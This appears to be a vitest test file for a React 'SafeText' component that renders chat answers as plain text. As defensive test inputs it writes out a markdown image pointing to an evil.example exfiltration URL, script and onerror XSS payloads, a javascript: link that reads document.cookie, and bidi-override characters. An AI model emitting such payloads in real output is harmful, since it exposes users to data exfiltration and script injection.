import { render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import { MOCK_CHAT_HOSTILE_REPLY } from "@/mocks/chat";

import { cleanAnswerText, parseBlocks, SafeText } from "./render-safe";

const HIDDEN_CHARS = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u061C\u200B-\u200F\u202A-\u202E\u2060-\u2064\u2066-\u2069\uFEFF]/;

/** Every attribute value in the rendered tree. */
function attributes(root: Element): string[] {
  return [root, ...root.querySelectorAll("*")].flatMap((el) => [...el.attributes].map((a) => `${a.name}=${a.value}`));
}

describe("SafeText", () => {
  it("md_image_exfil: an image becomes its alt text, with no <img> and no request", () => {
    const fetchSpy = vi.spyOn(globalThis, "fetch");
    const { container } = render(<SafeText text="Here is the chart: ![x](https://evil.example/?d=1)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toBe("Here is the chart: x");
    expect(attributes(container).join(" ")).not.toContain("evil.example");
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("html_script: tags are literal text, never elements", () => {
    const { container } = render(<SafeText text={"<script>alert('chat')</script> <img src=x onerror=alert(1)> <b>bold</b>"} />);
    expect(container.querySelector("script, img, b, iframe")).toBeNull();
    expect(container.textContent).toBe("<script>alert('chat')</script> <img src=x onerror=alert(1)> <b>bold</b>");
  });

  it("javascript_link: a link becomes its label, with no anchor and no href", () => {
    const { container } = render(<SafeText text="Read more [here](javascript:alert(document.cookie)) or at www.evil.example." />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toBe("Read more here or at www.evil.example.");
    expect(attributes(container).some((a) => /href|javascript:/i.test(a))).toBe(false);
  });

  it("strips bidi controls, zero-width and control characters", () => {
    const text = "Revenue is \u202E%04 nwod\u202C and \u2066ignore\u2069 to\u200B\u200Dtal\u0007.\uFEFF";
    expect(cleanAnswerText(text)).toBe("Revenue is %04 nwod and ignore total.");
    const { container } = render(<SafeText text={text} />);
    expect(HIDDEN_CHARS.test(container.textContent ?? "")).toBe(false);
  });

  it("renders the whole hostile mock answer as plain text", () => {
    const { container } = render(<SafeText text={MOCK_CHAT_HOSTILE_REPLY} />);
    expect(container.querySelector("img, script, a, iframe, object, embed, svg, style, link")).toBeNull();
    expect(HIDDEN_CHARS.test(container.textContent ?? "")).toBe(false);
    expect(container.textContent).toContain("<script>alert('chat')</script>");
    expect(attributes(container).join(" ")).not.toMatch(/evil|javascript|onerror|src=/i);
  });

  it("supports paragraphs, bullet and numbered lists, bold and inline code only", () => {
    const text = "# Not a heading\nSecond line\n\n- one **big** item\n* two `code`\n\n3. three\n4. four\n\n> quote _em_ ~~x~~";
    const { container } = render(<SafeText text={text} />);
    const blocks = [...(container.firstElementChild?.children ?? [])].map((el) => el.tagName);
    expect(blocks).toEqual(["P", "UL", "OL", "P"]);
    expect(container.querySelector("h1, h2, h3, blockquote, em, del")).toBeNull();
    expect(container.querySelector("p")?.textContent).toBe("# Not a headingSecond line");
    expect(container.querySelectorAll("p br")).toHaveLength(1);
    expect(container.querySelector("strong")?.textContent).toBe("big");
    expect(container.querySelector("code")?.textContent).toBe("code");
    expect(container.querySelector("ol")?.getAttribute("start")).toBe("3");
    expect([...container.querySelectorAll("li")].map((li) => li.textContent)).toEqual(["one big item", "two code", "three", "four"]);
    expect(container.firstElementChild?.className).toContain("tabular-nums");
  });

  it("caps an answer at 4,000 characters", () => {
    expect(cleanAnswerText("a".repeat(5000))).toHaveLength(4000);
    expect(parseBlocks("")).toEqual([]);
  });

  it("tt_no_createHTML: rendering never writes an HTML string to the DOM", () => {
    const inner = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
    const outer = Object.getOwnPropertyDescriptor(Element.prototype, "outerHTML");
    const sinks: string[] = [];
    Object.defineProperty(Element.prototype, "innerHTML", {
      configurable: true,
      get: inner?.get,
      set(v: string) {
        sinks.push(`innerHTML ${v}`);
        inner?.set?.call(this, v);
      },
    });
    Object.defineProperty(Element.prototype, "outerHTML", {
      configurable: true,
      get: outer?.get,
      set(v: string) {
        sinks.push(`outerHTML ${v}`);
        outer?.set?.call(this, v);
      },
    });
    const adjacent = vi.spyOn(Element.prototype, "insertAdjacentHTML");
    const write = vi.spyOn(document, "write");
    try {
      render(<SafeText text={`${MOCK_CHAT_HOSTILE_REPLY}\n\n- **a** \`b\``} />);
      expect(sinks).toEqual([]);
      expect(adjacent).not.toHaveBeenCalled();
      expect(write).not.toHaveBeenCalled();
    } finally {
      if (inner) Object.defineProperty(Element.prototype, "innerHTML", inner);
      if (outer) Object.defineProperty(Element.prototype, "outerHTML", outer);
    }
  });
});
